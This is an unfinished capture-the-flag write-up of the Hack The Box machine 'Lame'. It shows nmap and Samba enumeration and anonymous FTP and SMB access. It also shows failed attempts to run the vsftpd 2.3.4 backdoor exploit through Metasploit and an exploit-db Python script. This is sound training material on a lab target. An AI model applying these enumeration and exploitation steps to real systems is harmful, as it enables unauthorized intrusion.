---
title: "Hack The Box - Lame [In Progress]"
date: 2023-09-16
---
## Description
Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement.

## Enumeration
The first step is to check for the services available on the machine:
```
$nmap -sC -sV -p- 10.129.151.43 | tee -a nmap
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 11:43 CEST
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.60 seconds
```
It seems ping are blocked so I try again with `-Pn` as suggested:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 11:44 CEST
Nmap scan report for 10.129.151.43
Host is up (0.021s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.22
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 2h00m26s, deviation: 2h49m45s, median: 24s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-09-16T05:47:37-04:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 171.55 seconds
```
### FTP
It seems there is an FTP server with anonymous login allowed. Let's look what we get on it:
```
$ftp 10.129.151.43
Connected to 10.129.151.43.
220 (vsFTPd 2.3.4)
Name (10.129.151.43:pierre): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 .
drwxr-xr-x    2 0        65534        4096 Mar 17  2010 ..
226 Directory send OK.
ftp> pwd
257 "/"
```
It seems there is nothing interesting on the server.

We can see in the nmap report that the server is vsFTPd 2.3.4:
```
$searchsploit vsFTPd | tee -a searchsploit_vsFTPd
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                              |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
vsftpd 2.0.5 - 'CWD' (Authenticated) Remote Memory Consumption                                                                                              | linux/dos/5814.pl
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (1)                                                                                              | windows/dos/31818.sh
vsftpd 2.0.5 - 'deny_file' Option Remote Denial of Service (2)                                                                                              | windows/dos/31819.pl
vsftpd 2.3.2 - Denial of Service                                                                                                                            | linux/dos/16270.c
vsftpd 2.3.4 - Backdoor Command Execution                                                                                                                   | unix/remote/49757.py
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)                                                                                                      | unix/remote/17491.rb
vsftpd 3.0.3 - Remote Denial of Service                                                                                                                     | multiple/remote/49719.py
------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```
It seems to be an exploit for this version of the server. Let's use `msfconsole` to get more information on it.
```
[msf](Jobs:0 Agents:0) >> search exploit vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

[msf](Jobs:0 Agents:0) >> use 0
[*] No payload configured, defaulting to cmd/unix/interact
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> info

       Name: VSFTPD v2.3.4 Backdoor Command Execution
     Module: exploit/unix/ftp/vsftpd_234_backdoor
   Platform: Unix
       Arch: cmd
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2011-07-03

Provided by:
  hdm <x@hdm.io>
  MC <mc@metasploit.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic

Check supported:
  No

Basic options:
  Name    Current Setting  Required  Description
  ----    ---------------  --------  -----------
  RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
  RPORT   21               yes       The target port (TCP)

Payload information:
  Space: 2000
  Avoid: 0 characters

Description:
  This module exploits a malicious backdoor that was added to the 
  VSFTPD download archive. This backdoor was introduced into the 
  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
  according to the most recent information available. This backdoor 
  was removed on July 3rd 2011.

References:
  OSVDB (73573)
  http://pastebin.com/AetT9sS5
  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html


View the full module info with the info -d command.
```
Let's try to exploit it:
```
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> set RHOSTS 10.129.151.43
RHOSTS => 10.129.151.43
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> run

[*] 10.129.151.43:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.151.43:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
I tried to look at different payloads but it seems I do not have many choices:
```
[msf](Jobs:0 Agents:0) exploit(unix/ftp/vsftpd_234_backdoor) >> show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection
```
Searchsploit references another exploit using Python:
```
$cp /usr/share/exploitdb/exploits/unix/remote/49757.py vsftpd_exploit.py
$python3 vsftpd_exploit.py 10.129.123.233
Traceback (most recent call last):
  File "/home/pierre/Documents/htb/machines/lame/vsftpd_exploit.py", line 37, in <module>
    tn2=Telnet(host, 6200)
  File "/usr/lib/python3.9/telnetlib.py", line 218, in __init__
    self.open(host, port, timeout)
  File "/usr/lib/python3.9/telnetlib.py", line 235, in open
    self.sock = socket.create_connection((host, port), timeout)
  File "/usr/lib/python3.9/socket.py", line 843, in create_connection
    raise err
  File "/usr/lib/python3.9/socket.py", line 831, in create_connection
    sock.connect(sa)
TimeoutError: [Errno 110] Connection timed out
```
It seems no backdoor is opened at port 6200. Maybe the server has been patched.
### Samba
Using `msfconsole`, we can get the version of the Samba server:
```
[msf](Jobs:0 Agents:0) >> search scanner smb

Matching Modules
================

   #   Name                                                            Disclosure Date  Rank    Check  Description
   -   ----                                                            ---------------  ----    -----  -----------
   20  auxiliary/scanner/smb/smb_version                                                normal  No     SMB Version Detection

Interact with a module by name or index. For example info 23, use 23 or use auxiliary/scanner/smb/impacket/wmiexec

[msf](Jobs:0 Agents:0) >> use 20
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> options

Module options (auxiliary/scanner/smb/smb_version):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   THREADS  1                yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> set RHOSTS 10.129.123.233
RHOSTS => 10.129.123.233
[msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_version) >> run

[*] 10.129.123.233:445    - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.129.123.233:445    -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.129.123.233:       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
Well... this information was already available in the nmap log. :)

We can also use nmap scripts to enumerate Samba servers:
```
$nmap --script "smb-enum-*" -Pn -p 445 10.129.123.233 | tee -a scans/nmap_smb_enum
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-16 13:59 CEST
Nmap scan report for 10.129.123.233
Host is up (0.021s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.129.123.233\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.123.233\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.129.123.233\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.123.233\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.129.123.233\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE
| smb-enum-users: 
|   LAME\backup (RID: 1068)
|     Full name:   backup
|     Flags:       Normal user account, Account disabled
|   LAME\bin (RID: 1004)
|     Full name:   bin
|     Flags:       Normal user account, Account disabled
|   LAME\bind (RID: 1210)
|     Flags:       Normal user account, Account disabled
|   LAME\daemon (RID: 1002)
|     Full name:   daemon
|     Flags:       Normal user account, Account disabled
|   LAME\dhcp (RID: 1202)
|     Flags:       Normal user account, Account disabled
|   LAME\distccd (RID: 1222)
|     Flags:       Normal user account, Account disabled
|   LAME\ftp (RID: 1214)
|     Flags:       Normal user account, Account disabled
|   LAME\games (RID: 1010)
|     Full name:   games
|     Flags:       Normal user account, Account disabled
|   LAME\gnats (RID: 1082)
|     Full name:   Gnats Bug-Reporting System (admin)
|     Flags:       Normal user account, Account disabled
|   LAME\irc (RID: 1078)
|     Full name:   ircd
|     Flags:       Normal user account, Account disabled
|   LAME\klog (RID: 1206)
|     Flags:       Normal user account, Account disabled
|   LAME\libuuid (RID: 1200)
|     Flags:       Normal user account, Account disabled
|   LAME\list (RID: 1076)
|     Full name:   Mailing List Manager
|     Flags:       Normal user account, Account disabled
|   LAME\lp (RID: 1014)
|     Full name:   lp
|     Flags:       Normal user account, Account disabled
|   LAME\mail (RID: 1016)
|     Full name:   mail
|     Flags:       Normal user account, Account disabled
|   LAME\man (RID: 1012)
|     Full name:   man
|     Flags:       Normal user account, Account disabled
|   LAME\msfadmin (RID: 3000)
|     Full name:   msfadmin,,,
|     Flags:       Normal user account
|   LAME\mysql (RID: 1218)
|     Full name:   MySQL Server,,,
|     Flags:       Normal user account, Account disabled
|   LAME\news (RID: 1018)
|     Full name:   news
|     Flags:       Normal user account, Account disabled
|   LAME\nobody (RID: 501)
|     Full name:   nobody
|     Flags:       Normal user account, Account disabled
|   LAME\postfix (RID: 1212)
|     Flags:       Normal user account, Account disabled
|   LAME\postgres (RID: 1216)
|     Full name:   PostgreSQL administrator,,,
|     Flags:       Normal user account, Account disabled
|   LAME\proftpd (RID: 1226)
|     Flags:       Normal user account, Account disabled
|   LAME\proxy (RID: 1026)
|     Full name:   proxy
|     Flags:       Normal user account, Account disabled
|   LAME\root (RID: 1000)
|     Full name:   root
|     Flags:       Normal user account, Account disabled
|   LAME\service (RID: 3004)
|     Full name:   ,,,
|     Flags:       Normal user account, Account disabled
|   LAME\sshd (RID: 1208)
|     Flags:       Normal user account, Account disabled
|   LAME\sync (RID: 1008)
|     Full name:   sync
|     Flags:       Normal user account, Account disabled
|   LAME\sys (RID: 1006)
|     Full name:   sys
|     Flags:       Normal user account, Account disabled
|   LAME\syslog (RID: 1204)
|     Flags:       Normal user account, Account disabled
|   LAME\telnetd (RID: 1224)
|     Flags:       Normal user account, Account disabled
|   LAME\tomcat55 (RID: 1220)
|     Flags:       Normal user account, Account disabled
|   LAME\user (RID: 3002)
|     Full name:   just a user,111,,
|     Flags:       Normal user account
|   LAME\uucp (RID: 1020)
|     Full name:   uucp
|     Flags:       Normal user account, Account disabled
|   LAME\www-data (RID: 1066)
|     Full name:   www-data
|_    Flags:       Normal user account, Account disabled
|_smb-enum-sessions: ERROR: Script execution failed (use -d to debug)

Nmap done: 1 IP address (1 host up) scanned in 380.73 seconds
```
We know that there is two shares with anonymous access: IPC and tmp. There is also different accounts that are not disabled: msfadmin and user.
Anonymous login to these shares seem to fail:
```
┌─[✗]─[pierre@parrot]─[~/Documents/htb/machines/lame]
└──╼ $smbclient //10.129.123.233/tmp -W LAME -U %
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
┌─[✗]─[pierre@parrot]─[~/Documents/htb/machines/lame]
└──╼ $smbclient //10.129.123.233/IPC -W LAME -U %
protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
```
I note that I have the error `NT_STATUS_CONNECTION_DISCONNECTED` which means that the protocol negotiation failed.
This can be fixed by add these lines in `/etc/samba/smb.conf` under `[global]`:
```
client min protocol = CORE
client max protocol = SMB3
```
I can now be logged in the tmp share:
```
┌─[✗]─[pierre@parrot]─[~/Documents/htb/machines/lame]
└──╼ $smbclient //10.129.123.233/tmp -W LAME -U %
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Sep 16 15:04:16 2023
  ..                                 DR        0  Sat Oct 31 07:33:58 2020
  5621.jsvc_up                        R        0  Sat Sep 16 13:28:42 2023
  .ICE-unix                          DH        0  Sat Sep 16 13:27:28 2023
  vmware-root                        DR        0  Sat Sep 16 13:28:37 2023
  .X11-unix                          DH        0  Sat Sep 16 13:27:54 2023
  .X0-lock                           HR       11  Sat Sep 16 13:27:54 2023
  vgauthsvclog.txt.0                  R     1600  Sat Sep 16 13:27:27 2023
```
Only two files can be retrieved: `vgauthsvclog.txt.0` and `.X0-lock`:
```
$cat X0-lock 
      5683
$cat vgauthsvclog.txt.0 
[Sep 16 07:27:26.972] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Sep 16 07:27:26.972] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Sep 16 07:27:26.972] [ message] [VGAuthService] Group 'service'
[Sep 16 07:27:26.972] [ message] [VGAuthService] 	 samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Sep 16 07:27:26.972] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Sep 16 07:27:27.033] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[Sep 16 07:27:27.033] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[Sep 16 07:27:27.033] [ message] [VGAuthService] Group 'service'
[Sep 16 07:27:27.033] [ message] [VGAuthService] 	 samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[Sep 16 07:27:27.033] [ message] [VGAuthService] Pref_LogAllEntries: End of preferences
[Sep 16 07:27:27.033] [ message] [VGAuthService] Cannot load message catalog for domain 'VGAuthService', language 'C', catalog dir '.'.
[Sep 16 07:27:27.033] [ message] [VGAuthService] INIT SERVICE
[Sep 16 07:27:27.033] [ message] [VGAuthService] Using '/var/lib/vmware/VGAuth/aliasStore' for alias store root directory
[Sep 16 07:27:27.082] [ message] [VGAuthService] SAMLCreateAndPopulateGrammarPool: Using '/usr/lib/vmware-vgauth/schemas' for SAML schemas
[Sep 16 07:27:27.112] [ message] [VGAuthService] SAML_Init: Allowing 300 of clock skew for SAML date validation
[Sep 16 07:27:27.112] [ message] [VGAuthService] BEGIN SERVICE
```
I do not know what to do with this information.
